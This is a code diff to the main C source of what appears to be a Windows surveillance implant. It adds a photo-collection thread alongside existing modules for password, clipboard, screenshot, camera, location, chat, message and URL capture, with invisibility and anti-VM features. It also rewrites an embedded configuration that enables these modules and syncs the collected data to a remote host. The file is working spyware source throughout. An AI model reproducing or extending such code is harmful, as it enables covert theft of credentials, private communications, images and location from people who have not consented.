@@ -16,13 +16,21 @@
 #include "zmem.h"
 #include "conf.h"
 #include "invisibility.h"
+#include "antivm.h"
 
+/* modules */
 #include "position.h"
 #include "social.h"
 #include "clipboard.h"
 #include "password.h"
 #include "screenshot.h"
-#include "antivm.h"
+#include "photo.h"
+
+#ifdef _DEBUG
+	#include <vld.h>
+#endif
+
+
 
 #ifndef _GLOBAL_VERSION_FUNCTIONS_
 	#define _GLOBAL_VERSION_FUNCTIONS_
@@ -36,7 +44,6 @@
 #define __IDxtKey_INTERFACE_DEFINED__
 #include "camera.h"
 
-#include "yahoo.h"
 #include "url.h"
 
 BYTE pServerKey[32];
@@ -51,11 +58,12 @@ HANDLE hMsgTimer = NULL;
 BOOL bCollectEvidences = TRUE;
 
 #ifndef _DEBUG
-//BYTE EMBEDDED_CONF[513] = "\xEF\xBE\xAD\xDE""CONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONF";
-BYTE EMBEDDED_CONF[513] = "CONF""CONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONF";
+////BYTE EMBEDDED_CONF[513] = "\xEF\xBE\xAD\xDE""CONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONF";
+//BYTE EMBEDDED_CONF[513] = "CONF""CONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONFCONF";
 #else
-BYTE EMBEDDED_CONF[513] =  "\x90\x01\x00\x00{\"camera\": {\"enabled\":true,\"repeat\":5,\"iter\":null},\"position\":{\"enabled\":true,\"repeat\":5},\"screenshot\":{\"enabled\":true,\"repeat\":60},\"addressbook\":{\"enabled\":true},\"chat\":{\"enabled\":true},\"clipboard\":{\"enabled\":true},\"device\":{\"enabled\":true},\"messages\":{\"enabled\":true},\"password\":{\"enabled\":true},\"url\":{\"enabled\":true},\"sync\":{\"host\":\"192.168.100.100\",\"repeat\":1}}\x00\x16\xc0\xad\xbb\x01\xc0\xa2\x72\x3b\x23\xff\x46\x93\x68\x9f\x18\x23\x27\x9f\xee";
+//BYTE EMBEDDED_CONF[513] =  "\x90\x01\x00\x00{\"camera\": {\"enabled\":true,\"repeat\":5,\"iter\":null},\"position\":{\"enabled\":true,\"repeat\":5},\"screenshot\":{\"enabled\":true,\"repeat\":60},\"addressbook\":{\"enabled\":true},\"chat\":{\"enabled\":true},\"clipboard\":{\"enabled\":true},\"device\":{\"enabled\":true},\"messages\":{\"enabled\":true},\"password\":{\"enabled\":true},\"url\":{\"enabled\":true},\"sync\":{\"host\":\"192.168.100.100\",\"repeat\":1}}\x00\x16\xc0\xad\xbb\x01\xc0\xa2\x72\x3b\x23\xff\x46\x93\x68\x9f\x18\x23\x27\x9f\xee";
 //BYTE EMBEDDED_CONF[513] =  "\x90\x01\x00\x00{\"camera\": {\"enabled\":false,\"repeat\":20,\"iter\":10000},\"position\":{\"enabled\":false,\"repeat\":5},\"screenshot\":{\"enabled\":false,\"repeat\":5},\"addressbook\":{\"enabled\":false},\"chat\":{\"enabled\":false},\"clipboard\":{\"enabled\":false},\"device\":{\"enabled\":false},\"messages\":{\"enabled\":false},\"password\":{\"enabled\":false},\"url\":{\"enabled\":false},\"sync\":{\"host\":\"192.168.100.100\",\"repeat\":10}}\x00\x16\xc0\xad\xbb\x01\xc0\xa2\x72\x3b\x23\xff\x46\x93\x68\x9f\x18\x23\x27\x9f\xee";
+BYTE EMBEDDED_CONF[513] =  "\x90\x01\x00\x00{\"camera\": {\"enabled\":false,\"repeat\":5,\"iter\":null},\"position\":{\"enabled\":true,\"repeat\":5},\"screenshot\":{\"enabled\":false,\"repeat\":60},\"photo\":{\"enabled\":false},\"addressbook\":{\"enabled\":false},\"chat\":{\"enabled\":false},\"clipboard\":{\"enabled\":false},\"device\":{\"enabled\":false},\"messages\":{\"enabled\":true},\"password\":{\"enabled\":false},\"url\":{\"enabled\":false},\"sync\":{\"host\":\"192.168.100.100\",\"repeat\":1}}\x00\x16\xc0\xad\xbb\x01\xc0\xa2\x72\x3b\x23\xff\x46\x93\x68\x9f\x18\x23\x27\x9f\xee";
 #endif
 
 extern VOID SyncThreadFunction();
@@ -91,6 +99,7 @@ HANDLE hScreenShotThread = NULL;
 HANDLE hSocialThread = NULL;
 HANDLE hCameraThread = NULL;
 HANDLE hURLThread = NULL;
+HANDLE hPhotoThread = NULL;
 
 BOOL bPositionThread = FALSE;
 BOOL bClipBoardThread = FALSE;
@@ -99,6 +108,7 @@ BOOL bScreenShotThread = FALSE;
 BOOL bSocialThread = FALSE;
 BOOL bCameraThread = FALSE;
 BOOL bURLThread = FALSE;
+BOOL bPhotoThread = FALSE;
 
 int CALLBACK 
 WinMain(
@@ -426,4 +436,21 @@ VOID StartModules()
 	}
 	else
 		bURLThread = FALSE;
+
+	/* photo module */
+	if (ConfIsModuleEnabled(L"photo"))
+	{
+		if (hPhotoThread == NULL)
+		{
+#ifdef _DEBUG
+			OutputDebug(L"[*] Starting hPhotoThread\n");
+#endif 
+			hPhotoThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PhotoMain, NULL, 0, NULL);
+			bPhotoThread = TRUE;
+		}
+	}
+	else
+		bPhotoThread = FALSE;
+
+
 }
